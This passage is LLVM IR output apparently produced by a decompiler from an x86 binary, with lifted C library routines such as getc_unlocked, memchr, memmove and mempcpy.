  %v4_8055739 = inttoptr i32 %v3_8055739 to i8*
  store i8 %v1_80556e5, i8* %v4_8055739, align 1
  %v0_805573c = load i32, i32* @ecx, align 4
  %v1_805573c = inttoptr i32 %v0_805573c to i32*
  store i32 112, i32* %v1_805573c, align 4
  %v0_8055742 = load i32, i32* %esi.global-to-local, align 4
  %v1_8055742 = load i32, i32* @ecx, align 4
  %v2_8055742 = add i32 %v1_8055742, 4
  %v3_8055742 = inttoptr i32 %v2_8055742 to i32*
  store i32 %v0_8055742, i32* %v3_8055742, align 4
  %v0_8055745 = load i32, i32* %eax.global-to-local, align 4
  %v1_8055745 = load i32, i32* @ecx, align 4
  %v2_8055745 = add i32 %v1_8055745, 8
  %v3_8055745 = inttoptr i32 %v2_8055745 to i32*
  store i32 %v0_8055745, i32* %v3_8055745, align 4
  %v0_8055748 = load i32, i32* @ecx, align 4
  %v1_8055748 = add i32 %v0_8055748, 12
  store i32 %v1_8055748, i32* @ecx, align 4
  br label %dec_label_pc_805574b

dec_label_pc_805574b:                             ; preds = %dec_label_pc_80556d5, %dec_label_pc_8055370, %dec_label_pc_805572d
  %v0_80557cc = phi i32 [ %v1_805575884, %dec_label_pc_80556d5 ], [ %v2_8055378, %dec_label_pc_8055370 ], [ %v1_8055748, %dec_label_pc_805572d ]
  %v2_805574b = ptrtoint i32* %stack_var_-152 to i32
  store i32 %v2_805574b, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805574f

dec_label_pc_805574f:                             ; preds = %dec_label_pc_805574f, %dec_label_pc_805574b
  %v0_805574f = phi i32 [ %v2_805574b, %dec_label_pc_805574b ], [ %v1_8055751, %dec_label_pc_805574f ]
  %stack_var_-216.0 = phi i32 [ %v3_8055263, %dec_label_pc_805574b ], [ %v5_8055754, %dec_label_pc_805574f ]
  %v1_805574f = inttoptr i32 %v0_805574f to i32*
  %v2_805574f = load i32, i32* %v1_805574f, align 4
  store i32 %v2_805574f, i32* %edx.global-to-local, align 4
  %v1_8055751 = add i32 %v0_805574f, 12
  store i32 %v1_8055751, i32* %eax.global-to-local, align 4
  %v5_8055754 = sub i32 %stack_var_-216.0, %v2_805574f
  %v7_8055758 = icmp ult i32 %v1_8055751, %v0_80557cc
  br i1 %v7_8055758, label %dec_label_pc_805574f, label %dec_label_pc_805575c

dec_label_pc_805575c:                             ; preds = %dec_label_pc_805574f
  %v5_8055765 = icmp eq i8 %stack_var_-26.0, 0
  %v1_8055775 = icmp eq i1 %v5_8055765, false
  %v2_8055775 = zext i1 %v1_8055775 to i32
  %v2_8055778 = sub i32 %v5_8055754, %v2_8055775
  store i32 %v2_8055778, i32* %edx.global-to-local, align 4
  store i32 160, i32* %stack_var_-168, align 4
  store i32 %v2_8055778, i32* %eax.global-to-local, align 4
  store i32 %v0_80557cc, i32* %esi.global-to-local, align 4
  %tmp141 = icmp slt i32 %v2_8055778, 1
  br i1 %tmp141, label %dec_label_pc_80557ce, label %dec_label_pc_805578e

dec_label_pc_805578e:                             ; preds = %dec_label_pc_805575c
  store i32 %tmp112, i32* %edx.global-to-local, align 4
  %v2_8055795 = inttoptr i32 %v1_80552a3 to i8*
  %v3_8055795 = load i8, i8* %v2_8055795, align 1
  %v4_8055795 = and i8 %v3_8055795, 8
  %v5_8055795 = icmp eq i8 %v4_8055795, 0
  br i1 %v5_8055795, label %dec_label_pc_80557b0, label %dec_label_pc_805579b

dec_label_pc_805579b:                             ; preds = %dec_label_pc_805578e
  %v1_805579b = add i32 %v0_80557cc, 12
  store i32 %v1_805579b, i32* %esi.global-to-local, align 4
  %v1_805579e = inttoptr i32 %v0_80557cc to i32*
  store i32 160, i32* %v1_805579e, align 4
  %v0_80557a4 = load i32, i32* %eax.global-to-local, align 4
  %v1_80557a4 = load i32, i32* @ecx, align 4
  %v2_80557a4 = add i32 %v1_80557a4, 4
  %v3_80557a4 = inttoptr i32 %v2_80557a4 to i32*
  store i32 %v0_80557a4, i32* %v3_80557a4, align 4
  %v0_80557a7 = load i32, i32* @ecx, align 4
  %v1_80557a7 = add i32 %v0_80557a7, 8
  %v2_80557a7 = inttoptr i32 %v1_80557a7 to i32*
  store i32 ptrtoint (i32* @global_var_805aa13.556 to i32), i32* %v2_80557a7, align 4
  br label %dec_label_pc_80557ce

dec_label_pc_80557b0:                             ; preds = %dec_label_pc_805578e
  store i32 %tmp112, i32* %edx.global-to-local, align 4
  %v1_80557b7 = add i32 %tmp112, 16
  %v2_80557b7 = inttoptr i32 %v1_80557b7 to i32*
  %v3_80557b7 = load i32, i32* %v2_80557b7, align 4
  %v9_80557b7 = icmp eq i32 %v3_80557b7, 48
  %v1_80557bb = icmp eq i1 %v9_80557b7, false
  br i1 %v1_80557bb, label %dec_label_pc_80557c8, label %dec_label_pc_80557bd

dec_label_pc_80557bd:                             ; preds = %dec_label_pc_80557b0
  %v3_80557bd = load i32, i32* %stack_var_-152, align 4
  %v5_80557bd = add i32 %v3_80557bd, %v2_8055778
  store i32 %v5_80557bd, i32* %stack_var_-152, align 4
  br label %dec_label_pc_80557cc

dec_label_pc_80557c3:                             ; preds = %dec_label_pc_80557d4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_80557fb

dec_label_pc_80557c8:                             ; preds = %dec_label_pc_80557b0
  br label %dec_label_pc_80557cc

dec_label_pc_80557cc:                             ; preds = %dec_label_pc_80557bd, %dec_label_pc_80557c8
  store i32 %v0_80557cc, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_80557ce

dec_label_pc_80557ce:                             ; preds = %dec_label_pc_805575c, %dec_label_pc_805579b, %dec_label_pc_80557cc
  store i32 0, i32* %edi.global-to-local, align 4
  %v2_80557d0 = ptrtoint i32* %stack_var_-168 to i32
  store i32 %v2_80557d0, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80557d4

dec_label_pc_80557d4:                             ; preds = %dec_label_pc_80557f2, %dec_label_pc_80557ce
  call void @__pseudo_call(i32 %tmp112)
  %v0_80557ed = load i32, i32* %eax.global-to-local, align 4
  %v1_80557ed = load i32, i32* %ebx.global-to-local, align 4
  %v2_80557ed = add i32 %v1_80557ed, 4
  %v3_80557ed = inttoptr i32 %v2_80557ed to i32*
  %v4_80557ed = load i32, i32* %v3_80557ed, align 4
  %v15_80557ed = icmp eq i32 %v0_80557ed, %v4_80557ed
  %v1_80557f0 = icmp eq i1 %v15_80557ed, false
  br i1 %v1_80557f0, label %dec_label_pc_80557c3, label %dec_label_pc_80557f2

dec_label_pc_80557f2:                             ; preds = %dec_label_pc_80557d4
  %v1_80557f2 = add i32 %v1_80557ed, 12
  store i32 %v1_80557f2, i32* %ebx.global-to-local, align 4
  %v0_80557f5 = load i32, i32* %edi.global-to-local, align 4
  %v2_80557f5 = add i32 %v0_80557f5, %v0_80557ed
  store i32 %v2_80557f5, i32* %edi.global-to-local, align 4
  %v1_80557f7 = load i32, i32* %esi.global-to-local, align 4
  %v7_80557f7 = icmp ult i32 %v1_80557f2, %v1_80557f7
  br i1 %v7_80557f7, label %dec_label_pc_80557d4, label %dec_label_pc_80557fb

dec_label_pc_80557fb:                             ; preds = %dec_label_pc_80557f2, %dec_label_pc_80557c3
  %v0_8055801 = phi i32 [ -1, %dec_label_pc_80557c3 ], [ %v2_80557f5, %dec_label_pc_80557f2 ]
  store i32 %v0_8055801, i32* %eax.global-to-local, align 4
  %v2_8055804 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_8055804, i32* @esi, align 4
  store i32 %v0_8055246, i32* @edi, align 4
  store i32 %v0_8055245, i32* @ebp, align 4
  ret i32 %v0_8055801

; uselistorder directives
  uselistorder i32 %v0_8055801, { 1, 0 }
  uselistorder i32 %v1_8055751, { 1, 2, 0 }
  uselistorder i32 %v0_805574f, { 1, 0 }
  uselistorder i32 %v0_80557cc, { 1, 3, 2, 4, 0 }
  uselistorder i32 %v0_8055722, { 1, 0 }
  uselistorder i32 %v9_8055719, { 1, 2, 3, 0 }
  uselistorder i32 %v0_8055711, { 1, 0 }
  uselistorder i32 %v0_80556e3, { 0, 2, 1, 3 }
  uselistorder i32 %v2_80556bc, { 1, 0 }
  uselistorder i32 %v1_80556bc, { 1, 0, 2 }
  uselistorder i32 %v2_80556ba, { 2, 0, 1, 3, 4 }
  uselistorder i32 %v2_80555f0, { 2, 1, 3, 0 }
  uselistorder i32 %v2_80555d6, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v1_805563b, { 4, 0, 3, 1, 2, 5, 6, 7 }
  uselistorder i32 %v0_80555a1, { 0, 2, 1 }
  uselistorder i32 %v1_805557a, { 1, 0 }
  uselistorder i32 %v0_8055575, { 1, 2, 0, 3 }
  uselistorder i32 %v2_8055542, { 1, 2, 3, 0, 4 }
  uselistorder i8 %v2_805553d, { 1, 0 }
  uselistorder i8 %v2_8055536, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v0_8055536, { 1, 0, 3, 2 }
  uselistorder i32 %v0_80554c0, { 1, 2, 0 }
  uselistorder i8 %stack_var_-206.1, { 3, 1, 4, 0, 2 }
  uselistorder i8 %v4_80554a5, { 1, 0 }
  uselistorder i32 %v1_8055491, { 1, 0 }
  uselistorder i32 %v0_8055485, { 1, 0 }
  uselistorder i32 %v4_805546c, { 1, 0 }
  uselistorder i32 %tmp149, { 3, 1, 2, 0 }
  uselistorder x86_fp80 %v3_8055471, { 1, 0 }
  uselistorder i32 %v2_805542f, { 1, 0, 2 }
  uselistorder i3 %v1_80552e5, { 1, 0 }
  uselistorder i8 %v4_8055364, { 1, 0 }
  uselistorder i32 %v3_80552a3, { 2, 0, 1, 3, 4 }
  uselistorder i32 %v1_80552a3, { 1, 0, 2 }
  uselistorder i8 %stack_var_-206.0, { 3, 2, 0, 4, 5, 1, 6, 7 }
  uselistorder i32 %v1_8055275, { 1, 0 }
  uselistorder i32 %v3_8055263, { 1, 0, 2 }
  uselistorder i32* %stack_var_-144, { 1, 0, 2 }
  uselistorder i32* %stack_var_-72, { 1, 0, 2 }
  uselistorder i32* %stack_var_-71, { 1, 0 }
  uselistorder i32* %stack_var_-132, { 2, 0, 1 }
  uselistorder i32* %stack_var_-27, { 1, 0 }
  uselistorder i32* %stack_var_-152, { 0, 1, 4, 2, 3 }
  uselistorder i32* %stack_var_-168, { 1, 0 }
  uselistorder i32 %tmp112, { 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 0, 1, 2, 4, 3 }
  uselistorder i3* %fpu_stat_TOP.global-to-local, { 0, 4, 5, 6, 7, 1, 8, 2, 3 }
  uselistorder i32* %esi.global-to-local, { 2, 0, 1, 3, 4, 5, 6, 7, 9, 11, 10, 8, 12, 13, 14, 15 }
  uselistorder i32* %edx.global-to-local, { 0, 1, 2, 3, 4, 7, 8, 5, 6, 9, 13, 12, 14, 10, 11, 15, 18, 16, 19, 17, 20, 21, 23, 22, 24, 25, 26, 27, 28, 29 }
  uselistorder i32* %edi.global-to-local, { 0, 2, 3, 1, 5, 4, 6, 8, 7, 9 }
  uselistorder i32* %ecx.global-to-local, { 0, 2, 1, 3, 4, 5, 6, 7, 8, 9 }
  uselistorder i32* %ebx.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 23, 10, 11, 24, 13, 14, 12, 18, 15, 16, 17, 19, 20, 21, 22 }
  uselistorder i32* %ebp.global-to-local, { 0, 1, 2, 6, 7, 3, 8, 10, 4, 9, 5, 11 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 3, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 4, 5, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31 }
  uselistorder i64 10, { 1, 0, 2 }
  uselistorder i32 165, { 1, 0 }
  uselistorder i32 21, { 1, 2, 0 }
  uselistorder i8 102, { 4, 1, 0, 3, 2 }
  uselistorder i8 103, { 1, 2, 0 }
  uselistorder i32 69, { 1, 2, 0 }
  uselistorder label %dec_label_pc_80557ce, { 2, 1, 0 }
  uselistorder label %dec_label_pc_80557cc, { 1, 0 }
  uselistorder label %dec_label_pc_805574b, { 2, 0, 1 }
  uselistorder label %dec_label_pc_80556fd, { 1, 0 }
  uselistorder label %dec_label_pc_80556d5, { 2, 0, 1 }
  uselistorder label %dec_label_pc_80556a4, { 1, 0 }
  uselistorder label %dec_label_pc_8055691, { 1, 0 }
  uselistorder label %dec_label_pc_8055677, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8055644, { 2, 0, 1 }
  uselistorder label %dec_label_pc_805562f, { 1, 0 }
  uselistorder label %dec_label_pc_8055624, { 1, 0 }
  uselistorder label %dec_label_pc_80555ab, { 2, 0, 1 }
  uselistorder label %dec_label_pc_805559d, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8055563, { 1, 0 }
  uselistorder label %dec_label_pc_8055533.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_80554ff, { 1, 0, 2 }
  uselistorder label %dec_label_pc_80554ce, { 0, 2, 1 }
  uselistorder label %dec_label_pc_80554b9, { 1, 0 }
  uselistorder label %dec_label_pc_8055370, { 1, 0 }
  uselistorder label %dec_label_pc_8055294, { 1, 0 }
  uselistorder label %dec_label_pc_805528b, { 1, 0 }
}

define i32 @getc_unlocked() local_unnamed_addr {
entry:
  %edx.global-to-local = alloca i32, align 4
  %tmp = call i16* @__decompiler_undefined_function_6()
  %stack_var_-5 = alloca i8, align 1
  %v0_8055808 = load i32, i32* @ebx, align 4
  %v4_805580c = ptrtoint i16* %tmp to i32
  store i32 %v4_805580c, i32* @ebx, align 4
  %v1_8055810 = add i32 %v4_805580c, 16
  %v2_8055810 = inttoptr i32 %v1_8055810 to i32*
  %v3_8055810 = load i32, i32* %v2_8055810, align 4
  %v2_8055813 = add i32 %v4_805580c, 24
  %v3_8055813 = inttoptr i32 %v2_8055813 to i32*
  %v4_8055813 = load i32, i32* %v3_8055813, align 4
  %v10_8055813 = icmp ult i32 %v3_8055810, %v4_8055813
  br i1 %v10_8055813, label %dec_label_pc_80558b5, label %dec_label_pc_805581c

dec_label_pc_805581c:                             ; preds = %entry
  %v2_805581c = load i16, i16* %tmp, align 2
  %v3_805581c = zext i16 %v2_805581c to i32
  %v1_805581f = and i32 %v3_805581c, 131
  %v6_8055829 = icmp ugt i32 %v1_805581f, 128
  br i1 %v6_8055829, label %dec_label_pc_8055843, label %dec_label_pc_805582b

dec_label_pc_805582b:                             ; preds = %dec_label_pc_805581c
  %v0_805582b = load i32, i32* @edx, align 4
  %v6_8055833 = call i32 @__stdio_trans2r_o(i16* nonnull %tmp, i32 128, i32 %v0_805582b, i32 %v0_805582b)
  %v1_805583b = icmp eq i32 %v6_8055833, 0
  %v1_805583d = icmp eq i1 %v1_805583b, false
  br i1 %v1_805583d, label %dec_label_pc_80558da, label %dec_label_pc_805582b.dec_label_pc_8055843_crit_edge

dec_label_pc_805582b.dec_label_pc_8055843_crit_edge: ; preds = %dec_label_pc_805582b
  %v0_8055843.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8055843

dec_label_pc_8055843:                             ; preds = %dec_label_pc_805582b.dec_label_pc_8055843_crit_edge, %dec_label_pc_805581c
  %v2_8055877 = phi i32 [ %v0_8055843.pre, %dec_label_pc_805582b.dec_label_pc_8055843_crit_edge ], [ %v4_805580c, %dec_label_pc_805581c ]
  %v1_8055843 = inttoptr i32 %v2_8055877 to i32*
  %v2_8055843 = load i32, i32* %v1_8055843, align 4
  store i32 %v2_8055843, i32* @ecx, align 4
  %v1_8055845 = urem i32 %v2_8055843, 65536
  store i32 %v1_8055845, i32* %edx.global-to-local, align 4
  %v2_8055848 = and i32 %v2_8055843, 2
  %v3_8055848 = icmp eq i32 %v2_8055848, 0
  br i1 %v3_8055848, label %dec_label_pc_8055866, label %dec_label_pc_805584d

dec_label_pc_805584d:                             ; preds = %dec_label_pc_8055843
  %v1_805584d = urem i32 %v2_8055843, 2
  store i32 %v1_805584d, i32* %edx.global-to-local, align 4
  %v1_8055850 = add i32 %v2_8055843, 65535
  %v1_8055853 = trunc i32 %v1_8055850 to i16
  %v3_8055853 = inttoptr i32 %v2_8055877 to i16*
  store i16 %v1_8055853, i16* %v3_8055853, align 2
  %v0_8055856 = load i32, i32* @ebx, align 4
  %v1_8055856 = load i32, i32* %edx.global-to-local, align 4
  %v2_8055856 = mul i32 %v1_8055856, 4
  %v3_8055856 = add i32 %v0_8055856, 36
  %v4_8055856 = add i32 %v3_8055856, %v2_8055856
  %v5_8055856 = inttoptr i32 %v4_8055856 to i8*
  %v6_8055856 = load i8, i8* %v5_8055856, align 1
  %v7_8055856 = zext i8 %v6_8055856 to i32
  %v9_8055856 = and i32 %v1_8055856, -256
  %v10_8055856 = or i32 %v7_8055856, %v9_8055856
  store i32 %v10_8055856, i32* %edx.global-to-local, align 4
  %v1_805585a = add i32 %v0_8055856, 40
  %v2_805585a = inttoptr i32 %v1_805585a to i32*
  store i32 0, i32* %v2_805585a, align 4
  %v0_8055861 = load i32, i32* %edx.global-to-local, align 4
  %v1_8055861 = urem i32 %v0_8055861, 256
  store i32 %v1_8055861, i32* @edx, align 4
  br label %dec_label_pc_80558dd

dec_label_pc_8055866:                             ; preds = %dec_label_pc_8055843
  %v1_8055866 = add i32 %v2_8055877, 16
  %v2_8055866 = inttoptr i32 %v1_8055866 to i32*
  %v3_8055866 = load i32, i32* %v2_8055866, align 4
  store i32 %v3_8055866, i32* @eax, align 4
  %v1_8055869 = add i32 %v2_8055877, 20
  %v2_8055869 = inttoptr i32 %v1_8055869 to i32*
  %v3_8055869 = load i32, i32* %v2_8055869, align 4
  %v15_8055869 = icmp eq i32 %v3_8055869, %v3_8055866
  %v1_805586c = icmp eq i1 %v15_8055869, false
  br i1 %v1_805586c, label %dec_label_pc_80558b5, label %dec_label_pc_805586e

dec_label_pc_805586e:                             ; preds = %dec_label_pc_8055866
  %v1_805586e = add i32 %v2_8055877, 4
  %v2_805586e = inttoptr i32 %v1_805586e to i32*
  %v3_805586e = load i32, i32* %v2_805586e, align 4
  %v13_805586e = icmp eq i32 %v3_805586e, -2
  %v1_8055872 = icmp eq i1 %v13_805586e, false
  br i1 %v1_8055872, label %dec_label_pc_805587c, label %dec_label_pc_8055874

dec_label_pc_8055874:                             ; preds = %dec_label_pc_805586e
  %v1_8055874 = or i32 %v2_8055843, 4
  store i32 %v1_8055874, i32* @ecx, align 4
  %v1_8055877 = trunc i32 %v1_8055874 to i16
  %v3_8055877 = inttoptr i32 %v2_8055877 to i16*
  store i16 %v1_8055877, i16* %v3_8055877, align 2
  br label %dec_label_pc_80558da

dec_label_pc_805587c:                             ; preds = %dec_label_pc_805586e
  %v1_805587c = udiv i32 %v2_8055843, 256
  %v2_805587c = trunc i32 %v1_805587c to i8
  %v3_805587c = urem i8 %v2_805587c, 4
  %v4_805587c = icmp eq i8 %v3_805587c, 0
  %v8_805587c = zext i8 %v3_805587c to i32
  %v10_805587c = mul nuw nsw i32 %v8_805587c, 256
  %v11_805587c = urem i32 %v2_8055843, 256
  %v12_805587c = or i32 %v10_805587c, %v11_805587c
  store i32 %v12_805587c, i32* %edx.global-to-local, align 4
  br i1 %v4_805587c, label %dec_label_pc_8055891, label %dec_label_pc_8055881

dec_label_pc_8055881:                             ; preds = %dec_label_pc_805587c
  %v3_8055889 = call i32 @fflush_unlocked(i16* bitcast (i32** @global_var_805b298.477 to i16*))
  %v0_8055891.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8055891

dec_label_pc_8055891:                             ; preds = %dec_label_pc_805587c, %dec_label_pc_8055881
  %v0_80558c6 = phi i32 [ %v2_8055877, %dec_label_pc_805587c ], [ %v0_8055891.pre, %dec_label_pc_8055881 ]
  %v1_8055891 = add i32 %v0_80558c6, 8
  %v2_8055891 = inttoptr i32 %v1_8055891 to i32*
  %v3_8055891 = load i32, i32* %v2_8055891, align 4
  %v1_8055894 = add i32 %v0_80558c6, 12
  %v2_8055894 = inttoptr i32 %v1_8055894 to i32*
  %v3_8055894 = load i32, i32* %v2_8055894, align 4
  %v15_8055894 = icmp eq i32 %v3_8055894, %v3_8055891
  br i1 %v15_8055894, label %dec_label_pc_80558be, label %dec_label_pc_8055899

dec_label_pc_8055899:                             ; preds = %dec_label_pc_8055891
  %v2_805589c = add i32 %v0_80558c6, 24
  %v3_805589c = inttoptr i32 %v2_805589c to i32*
  store i32 %v3_8055891, i32* %v3_805589c, align 4
  %v0_805589f = load i32, i32* @ebx, align 4
  %v2_80558a0 = call i32 @__stdio_rfill(i32 %v0_805589f)
  %v1_80558a8 = icmp eq i32 %v2_80558a0, 0
  br i1 %v1_80558a8, label %dec_label_pc_80558da, label %dec_label_pc_80558ac

dec_label_pc_80558ac:                             ; preds = %dec_label_pc_8055899
  %v0_80558ac = load i32, i32* @ebx, align 4
  %v1_80558ac = add i32 %v0_80558ac, 20
  %v2_80558ac = inttoptr i32 %v1_80558ac to i32*
  %v3_80558ac = load i32, i32* %v2_80558ac, align 4
  %v2_80558af = add i32 %v0_80558ac, 24
  %v3_80558af = inttoptr i32 %v2_80558af to i32*
  store i32 %v3_80558ac, i32* %v3_80558af, align 4
  %v0_80558b2 = load i32, i32* @ebx, align 4
  %v1_80558b2 = add i32 %v0_80558b2, 16
  %v2_80558b2 = inttoptr i32 %v1_80558b2 to i32*
  %v3_80558b2 = load i32, i32* %v2_80558b2, align 4
  br label %dec_label_pc_80558b5

dec_label_pc_80558b5:                             ; preds = %dec_label_pc_8055866, %entry, %dec_label_pc_80558ac
  %v1_80558b9 = phi i32 [ %v2_8055877, %dec_label_pc_8055866 ], [ %v4_805580c, %entry ], [ %v0_80558b2, %dec_label_pc_80558ac ]
  %v0_80558b5 = phi i32 [ %v3_8055866, %dec_label_pc_8055866 ], [ %v3_8055810, %entry ], [ %v3_80558b2, %dec_label_pc_80558ac ]
  %v1_80558b5 = inttoptr i32 %v0_80558b5 to i8*
  %v2_80558b5 = load i8, i8* %v1_80558b5, align 1
  %v3_80558b5 = zext i8 %v2_80558b5 to i32
  store i32 %v3_80558b5, i32* @edx, align 4
  %v1_80558b8 = add i32 %v0_80558b5, 1
  %v2_80558b9 = add i32 %v1_80558b9, 16
  %v3_80558b9 = inttoptr i32 %v2_80558b9 to i32*
  store i32 %v1_80558b8, i32* %v3_80558b9, align 4
  %v0_80558dd.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_80558dd

dec_label_pc_80558be:                             ; preds = %dec_label_pc_8055891
  %v2_80558c1 = ptrtoint i8* %stack_var_-5 to i32
  %v5_80558c6 = inttoptr i32 %v0_80558c6 to i16*
  %v5_80558c7 = call i32 @__stdio_READ(i16* %v5_80558c6, i32 %v2_80558c1, i32 1)
  %v1_80558cf = icmp eq i32 %v5_80558c7, 0
  br i1 %v1_80558cf, label %dec_label_pc_80558da, label %dec_label_pc_80558d3

dec_label_pc_80558d3:                             ; preds = %dec_label_pc_80558be
  %v3_80558d3 = load i8, i8* %stack_var_-5, align 1
  %v4_80558d3 = sext i8 %v3_80558d3 to i32
  store i32 %v4_80558d3, i32* @edx, align 4
  br label %dec_label_pc_80558dd

dec_label_pc_80558da:                             ; preds = %dec_label_pc_80558be, %dec_label_pc_8055899, %dec_label_pc_805582b, %dec_label_pc_8055874
  store i32 -1, i32* @edx, align 4
  br label %dec_label_pc_80558dd

dec_label_pc_80558dd:                             ; preds = %dec_label_pc_80558d3, %dec_label_pc_80558b5, %dec_label_pc_805584d, %dec_label_pc_80558da
  %v0_80558dd = phi i32 [ %v4_80558d3, %dec_label_pc_80558d3 ], [ %v0_80558dd.pre, %dec_label_pc_80558b5 ], [ %v1_8055861, %dec_label_pc_805584d ], [ -1, %dec_label_pc_80558da ]
  store i32 %v0_8055808, i32* @ebx, align 4
  ret i32 %v0_80558dd

; uselistorder directives
  uselistorder i32 %v0_80558b5, { 1, 0 }
  uselistorder i32 %v3_8055891, { 1, 0 }
  uselistorder i32 %v0_80558c6, { 0, 1, 3, 2 }
  uselistorder i8 %v3_805587c, { 1, 0 }
  uselistorder i32 %v3_8055866, { 1, 0, 2 }
  uselistorder i32 %v1_8055861, { 1, 0 }
  uselistorder i32 %v2_8055843, { 1, 0, 4, 5, 2, 6, 3, 7 }
  uselistorder i32 %v2_8055877, { 0, 1, 2, 3, 5, 4, 6, 7 }
  uselistorder i8* %stack_var_-5, { 1, 0 }
  uselistorder i32 (i16*)* @fflush_unlocked, { 1, 0 }
  uselistorder i32 131, { 2, 1, 0 }
  uselistorder label %dec_label_pc_80558dd, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_80558da, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_80558b5, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8055891, { 1, 0 }
}

define i32 @__GI_memchr(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %zf.global-to-local = alloca i1, align 1
  %stack_var_-4 = alloca i32, align 4
  %v0_80558e4 = load i32, i32* @edi, align 4
  store i32 %v0_80558e4, i32* %stack_var_-4, align 4
  store i32 %arg3, i32* @ecx, align 4
  %v4_80558eb = ptrtoint i8* %arg1 to i32
  store i32 %v4_80558eb, i32* %edi.global-to-local, align 4
  %v1_80558f3 = icmp eq i32 %arg3, 0
  store i1 %v1_80558f3, i1* %zf.global-to-local, align 1
  br i1 %v1_80558f3, label %dec_label_pc_8055903, label %dec_label_pc_80558f7

dec_label_pc_80558f7:                             ; preds = %entry
  %v2_80558f7 = call i32 @_strlen(i8* %arg1)
  %v3_80558f7 = mul i32 %v2_80558f7, -1
  %v4_80558f7 = add i32 %v3_80558f7, -2
  store i32 %v4_80558f7, i32* @ecx, align 4
  %v0_80558f9 = load i1, i1* %zf.global-to-local, align 1
  br i1 %v0_80558f9, label %dec_label_pc_80558f7.dec_label_pc_8055900_crit_edge, label %dec_label_pc_80558fb

dec_label_pc_80558f7.dec_label_pc_8055900_crit_edge: ; preds = %dec_label_pc_80558f7
  %v0_8055900.pre = load i32, i32* %edi.global-to-local, align 4
  %phitmp = add i32 %v0_8055900.pre, -1
  br label %dec_label_pc_8055900

dec_label_pc_80558fb:                             ; preds = %dec_label_pc_80558f7
  store i32 1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_8055900

dec_label_pc_8055900:                             ; preds = %dec_label_pc_80558f7.dec_label_pc_8055900_crit_edge, %dec_label_pc_80558fb
  %v0_8055900 = phi i32 [ %phitmp, %dec_label_pc_80558f7.dec_label_pc_8055900_crit_edge ], [ 0, %dec_label_pc_80558fb ]
  %v8_8055900 = icmp eq i32 %v0_8055900, 0
  store i1 %v8_8055900, i1* %zf.global-to-local, align 1
  store i32 %v0_8055900, i32* %edi.global-to-local, align 4
  %v2_8055905.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_8055903

dec_label_pc_8055903:                             ; preds = %entry, %dec_label_pc_8055900
  %v2_8055905 = phi i32 [ %v0_80558e4, %entry ], [ %v2_8055905.pre, %dec_label_pc_8055900 ]
  %v0_8055903 = phi i32 [ 0, %entry ], [ %v0_8055900, %dec_label_pc_8055900 ]
  store i32 %v2_8055905, i32* @edi, align 4
  ret i32 %v0_8055903

; uselistorder directives
  uselistorder i32 %v0_8055900, { 2, 0, 1 }
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder label %dec_label_pc_8055903, { 1, 0 }
  uselistorder label %dec_label_pc_8055900, { 1, 0 }
}

define i32 @memmove(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp3 = inttoptr i32 %arg2 to i8*
  %stack_var_-8 = alloca i32, align 4
  %v0_8055909 = load i32, i32* @esi, align 4
  store i32 %v0_8055909, i32* %stack_var_-8, align 4
  %v4_805590a = ptrtoint i8* %arg1 to i32
  %v9_8055916 = icmp ugt i8* %tmp3, %arg1
  %v1_8055918 = icmp eq i1 %v9_8055916, false
  br i1 %v1_8055918, label %dec_label_pc_8055920, label %dec_label_pc_805591a

dec_label_pc_805591a:                             ; preds = %entry
  %v7_805591c = call i8* @_memcpy(i8* %arg1, i8* %tmp3, i32 %tmp)
  br label %dec_label_pc_805592c

dec_label_pc_8055920:                             ; preds = %entry
  %v3_8055920 = add i32 %arg2, -1
  %v4_8055920 = add i32 %v3_8055920, %tmp
  %v5_8055920 = inttoptr i32 %v4_8055920 to i8*
  %v3_8055924 = add i32 %v4_805590a, -1
  %v4_8055924 = add i32 %v3_8055924, %tmp
  %v5_8055924 = inttoptr i32 %v4_8055924 to i8*
  %v7_8055929 = call i8* @_memcpy(i8* %v5_8055924, i8* %v5_8055920, i32 %tmp)
  store i1 false, i1* @df, align 1
  br label %dec_label_pc_805592c

dec_label_pc_805592c:                             ; preds = %dec_label_pc_805591a, %dec_label_pc_8055920
  %v2_805592c = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_805592c, i32* @esi, align 4
  ret i32 %v4_805590a

; uselistorder directives
  uselistorder i8* %tmp3, { 1, 0 }
  uselistorder i32 %tmp, { 0, 1, 3, 2 }
  uselistorder i8* %arg1, { 2, 0, 1 }
  uselistorder label %dec_label_pc_805592c, { 1, 0 }
}

define i32 @__GI_mempcpy(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v0_8055930 = load i32, i32* @esi, align 4
  store i32 %arg1, i32* @esi, align 4
  %v3_8055943 = inttoptr i32 %arg1 to i16*
  %v4_8055943 = call i32 @memcpy(i16* %v3_8055943, i32 %arg2, i32 %arg3)
  %v0_8055948 = load i32, i32* @esi, align 4
  %v2_8055948 = add i32 %v0_8055948, %arg3
  store i32 %v0_8055930, i32* @esi, align 4
  ret i32 %v2_8055948
}

